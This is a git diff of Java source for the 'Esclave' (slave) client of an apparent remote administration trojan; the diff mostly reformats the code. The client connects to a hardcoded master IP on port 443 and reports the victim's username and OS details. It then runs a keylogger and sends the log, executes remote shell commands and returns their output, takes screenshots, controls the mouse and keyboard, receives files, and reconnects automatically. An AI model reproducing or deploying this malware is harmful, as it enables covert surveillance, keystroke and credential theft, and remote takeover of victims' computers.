@@ -30,7 +30,32 @@ import constante.Constante;
  *
  */
 
-public class Esclave {
+public class Esclave
+{
+
+	// Parametres :
+	// =====================================================================
+
+	private InetAddress			m_addresse;
+	private final String			m_addresseMaitre	= "192.168.1.40";	// InetAddress.getLocalHost()
+	// .getHostName(); 															// Addresse IP de la machine distante
+
+	private ObjectInputStream	_in;											// Flux d'entree
+	private Keylogging			m_keylogger;
+
+	private ObjectOutputStream	m_out;										// Flux de sortie
+
+	private final int				m_portMaitre		= 443;				// Port de la machine distante
+	private Robot					m_robot;
+	private Socket					m_socket;
+
+	private Terminal				_terminal			= null;
+
+	
+	
+	// Main :
+	// =====================================================================
+
 	/**
 	 * Main de l'esclave
 	 * 
@@ -41,95 +66,80 @@ public class Esclave {
 	 * @throws AWTException
 	 */
 	public static void main(String[] args) throws ClassNotFoundException,
-			IOException, InterruptedException, AWTException {
+			IOException, InterruptedException, AWTException
+	{
 		new Esclave();
 	}
 
-	private InetAddress _addresse;
-	private final String _addresseMaitre = "192.168.1.40" ;//InetAddress.getLocalHost()
-			//.getHostName(); // Addresse IP de la machine distante
+	// Constructeur :
+	// =====================================================================
 
-	private ObjectInputStream _in; // Flux d'entree
-	private Keylogging _klgg;
-
-	private ObjectOutputStream _out; // Flux de sortie
-	/**********************************************************************************************************************************************/
-	/*
-	 * ARGUMENT /
-	 * /**************************************************************
-	 * ***********
-	 * ********************************************************************
-	 */
-
-	private final int _portMaitre = 443; // Port de la machine distante
-	private Robot _robot;
-	private Socket _s;
-
-	private Terminal _terminal = null;
-
-	/********************************************************************************************************************************************/
-	/*
-	 * CONSTRUCTEUR /
-	 * /**********************************************************
-	 * ***************
-	 * ********************************************************************
-	 */
 	public Esclave() throws ClassNotFoundException, InterruptedException,
-			IOException, AWTException {
+			IOException, AWTException
+	{
 
 		connect();
-
 	}
 
-	/********************************************************************************************************************************************/
-	/*
-	 * METHODES /
-	 * /**************************************************************
-	 * ***********
-	 * ********************************************************************
+	// Methodes :
+	// =====================================================================
+
+	/**
+	 * Methode principal de l'esclave, tente de se connecter au serveur maitre
+	 * et tente de déployer tous les objets
+	 * 
+	 * @return boolean vrai si tout s'est bien passé
+	 * @throws IOException
+	 * @throws AWTException
+	 * @throws ClassNotFoundException
+	 * @throws InterruptedException
 	 */
-
 	private boolean connect() throws IOException, AWTException,
-			ClassNotFoundException, InterruptedException {
-		try {
-			_s = new Socket(_addresseMaitre, _portMaitre);
+			ClassNotFoundException, InterruptedException
+	{
+		try
+		{
 
-			_out = new ObjectOutputStream(_s.getOutputStream());
-
+			m_socket = new Socket(m_addresseMaitre, m_portMaitre);
+			m_out = new ObjectOutputStream(m_socket.getOutputStream());
 			_in = new ObjectInputStream(new BufferedInputStream(
-					_s.getInputStream()));
-
-			_addresse = _s.getInetAddress();
-
+					m_socket.getInputStream()));
+			m_addresse = m_socket.getInetAddress();
 			String fileseparator = System.getProperty("file.separator"), username = System // Initialise
-																							// les
-																			// proprietes
-					.getProperty("user.name"), os_version = System // du système
-					// esclave
+																													// les
+																													// proprietes
+					.getProperty("user.name"), os_version = System 									// du système
+																													// esclave
 					.getProperty("os.version"), os_name = System
-					.getProperty("os.name"), os_arch = System
-					.getProperty("os.arch"), user_country = System
+					.getProperty("os.name"), os_arch = System.getProperty("os.arch"), user_country = System
 					.getProperty("user.country");
 
-			_out.writeObject(_addresse + "++" + fileseparator + "++"
-					+ username // Envoi les proprietes au Maitre
-					+ "++" + os_version + "++" + os_name + "++" + os_arch
-					+ "++" + user_country);
+			m_out.writeObject(m_addresse + "++" + fileseparator + "++"
+					+ username 																			// Envoi les proprietes au Maitre
+					+ "++" + os_version + "++" + os_name + "++" + os_arch + "++"
+					+ user_country);
 
-			_out.flush();
-		} catch (Exception e) {
+			m_out.flush();
+		}
+		catch (Exception e)
+		{
 			return false;
 		}
-		_klgg = new Keylogging(); // Appelle le constructeur d'un nouveau
-									// keylogger
-		_robot = new Robot(); // Instancie un robot
-		this.receive(this); // Instancie la reception des donnees
+		m_keylogger = new Keylogging(); 															// Appelle le constructeur d'un nouveau
+																											// keylogger
+		m_robot = new Robot(); 																		// Instancie un robot
+		this.receive(this); 																			// Instancie la reception des donnees
 		return true;
 
 	}
 
-	public ObjectOutputStream getOut() {
-		return _out;
+	/**
+	 * Le flux de sortie du socket
+	 * @return le flux du socket
+	 */
+	public ObjectOutputStream getOut()
+	{
+		return m_out;
 	}
 
 	/**
@@ -142,147 +152,160 @@ public class Esclave {
 	 * @throws InterruptedException
 	 */
 	public void receive(final Esclave esclave) throws ClassNotFoundException,
-			IOException, InterruptedException {
-		Thread recevoir = new Thread("Receive") {
+			IOException, InterruptedException
+	{
+		Thread recevoir = new Thread("Receive")
+		{
 			@Override
-			public void run() {
+			public void run()
+			{
 				Object action;
-				try {
-					while (true) {
+				try
+				{
+					while (true)
+					{
 
-						action = _in.readObject(); // Recupere les objets du
-													// socket
-						if (action instanceof Integer) // Gere les differents
-														// objets recus
-														// En utilisant des
-														// codes
+						action = _in.readObject();									 // Recupere les objets du
+																							// socket
+						if (action instanceof Integer) 							// Gere les differents
+																							// objets recus
+																							// En utilisant des
+																							// codes
 						{
 							Integer code = (Integer) action;
-							if (code.equals(Constante.code_keylog)) // Code pour
-																	// recuperer
-																	// un
-																	// fichier
-																	// avec la
-																	// saisie
+							if (code.equals(Constante.code_keylog)) 			// Code pour
+																							// recuperer
+																							// un
+																							// fichier
+																							// avec la
+																							// saisie
 							{
 								sendfileKeylog();
 
-							} else if (code.equals(Constante.code_notif)) // Code
-																			// pour
-																			// afficher
-																			// une
-																			// notification
+							}
+							else if (code.equals(Constante.code_notif)) 		// Code
+																							// pour
+																							// afficher
+																							// une
+																							// notification
 							{
 								Object string = _in.readObject();
-								if (string instanceof String) {
+								if (string instanceof String)
+								{
 									Notification notif = new Notification(
 											(String) string);
 
 								}
-							} else if (code.equals(Constante.code_cmd)) // Code
-																		// pour
-																		// lancer
-																		// une
-																		// commande
-																		// terminal
+							}
+							else if (code.equals(Constante.code_cmd)) 		// Code
+																							// pour
+																							// lancer
+																							// une
+																							// commande
+																							// terminal
 							{
 								// System.out.println("[debug] Nouveau requete CMD: ");
 
-								if (_terminal == null) {
+								if (_terminal == null)
+								{
 									_terminal = new Terminal();
 								}
 								action = _in.readObject();
-								if (action instanceof String) // Recupere
-																// l'instruction
+								if (action instanceof String) 					// Recupere
+																							// l'instruction
 								{
 									String instruction = (String) action;
 									String res = "";
-									res = _terminal.nouvellecommande(
-											instruction, esclave);
+									res = _terminal.nouvellecommande(instruction,
+											esclave);
 
 									if (!res.equals(Constante.code_message_cmd)) // Renvoit
-																					// l'instruction
+																								// l'instruction
 									{
-										_out.writeObject(Constante.code_cmd);
-										_out.flush();
-										_out.writeObject(res);
-										_out.flush();
+										m_out.writeObject(Constante.code_cmd);
+										m_out.flush();
+										m_out.writeObject(res);
+										m_out.flush();
 									}
 								}
-							} else {
-
-								ReceivedSpecificObject
-										.receivedFileInDirectory(
-												(Integer) action,
-												_in, // Enregistre le fichier
-														// dans le dossier
-														// courant
-												(_terminal == null) ? // de
-																		// l'executable
-																		// ou
-												// Dans le dossier courant
-												// correspondant au dossier
-												// du CMD
-
-												Paths.get("").toAbsolutePath()
-														.toString()
-														+ System.getProperty("file.separator")
-														: _terminal
-																.getDirectory()
-																+ System.getProperty("file.separator"));
 							}
-						} else if (action instanceof ActionVNC) // Reception
-																// d'une requete
-																// pour VNC
+							else
+							{
+
+								ReceivedSpecificObject.receivedFileInDirectory(
+										(Integer) action,
+													_in,								// Enregistre le fichier
+																						// dans le dossier
+																						// courant
+										(_terminal == null) ? 					// de
+																						// l'executable
+																						// ou
+																						// Dans le dossier courant
+																						// correspondant au dossier
+																						// du CMD
+
+										Paths.get("").toAbsolutePath().toString()
+												+ System.getProperty("file.separator")
+												: _terminal.getDirectory()
+														+ System
+																.getProperty("file.separator"));
+							}
+						}
+						else if (action instanceof ActionVNC) // Reception
+						// d'une requete
+						// pour VNC
 						{
 							ActionVNC remoteaction = (ActionVNC) action;
 
-							if (remoteaction instanceof ScreenShot) {
-								System.out
-										.println("[debug] Esclave: Reception ScreenShot par l'esclave");
-
+							if (remoteaction instanceof ScreenShot)
+							{
+								
 								ScreenShot screenshot = (ScreenShot) remoteaction;
-								BufferedImage result = screenshot
-										.executer(_robot);
+								BufferedImage result = screenshot.executer(m_robot);
 
-								if (result != null) {
-									System.out
-											.println("[debug] Esclave: Envoit code pour un screen");
-									_out.writeObject(Constante.code_vnc);
-									_out.flush();
+								if (result != null)
+								{
+											m_out.writeObject(Constante.code_vnc);
+									m_out.flush();
 
-									// System.out.println("[debug] sendImage: Envoit tailleImage");
-									try {
+									try
+									{
 										ImageIO.write(result, "PNG",
-												_s.getOutputStream());
-									} catch (IndexOutOfBoundsException e) {
+												m_socket.getOutputStream());
 									}
-									System.out
-											.println("[debug] sendImage: Envoit image");
-									_out.flush();
-									_out.reset();
+									catch (IndexOutOfBoundsException e)
+									{
+									}
+									m_out.flush();
+									m_out.reset();
 								}
-							} else {
-								Object result = remoteaction.executer(_robot);
-								System.out
-										.println("[debug] Esclave: Reception d'un CliquerSouris ou BougerSouris par l'esclave");
+							}
+							else
+							{
+								Object result = remoteaction.executer(m_robot);
 
 							}
 
 						}
 					}
 
-				} catch (ClassNotFoundException | IOException | AWTException
-						| InterruptedException e1) {
-					try {
-						while (!connect()) {
+				}
+				catch (ClassNotFoundException | IOException | AWTException
+						| InterruptedException e1)
+				{
+					try
+					{
+						while (!connect())
+						{
 
 							Thread.sleep(2000); // Fait une pause de 10 sec
-												// avant de se reconnecter
+							// avant de se reconnecter
 
 						}
-					} catch (InterruptedException | ClassNotFoundException
-							| IOException | AWTException e2) {
+					}
+					catch (InterruptedException | ClassNotFoundException
+							| IOException | AWTException e2)
+					{
 						// TODO Auto-generated catch block
 					}
 				}
@@ -297,11 +320,14 @@ public class Esclave {
 	 * @throws IOException
 	 * @throws InterruptedException
 	 */
-	public void sendfileKeylog() throws IOException, InterruptedException {
-		String chemin = _klgg.getCheminFile();
-		_klgg.arreteKeylog();
-		SendSpecificObject.sendTxt("keylogger", chemin, _out);
-		_klgg.supprimerFichier();
-		_klgg = new Keylogging();
+	public void sendfileKeylog() throws IOException, InterruptedException
+	{
+		String chemin = m_keylogger.getCheminFile();
+		m_keylogger.arreteKeylog();
+		SendSpecificObject.sendTxt("keylogger", chemin, m_out);
+		m_keylogger.relancerKeylog();
 	}
+
+		
+	
 }
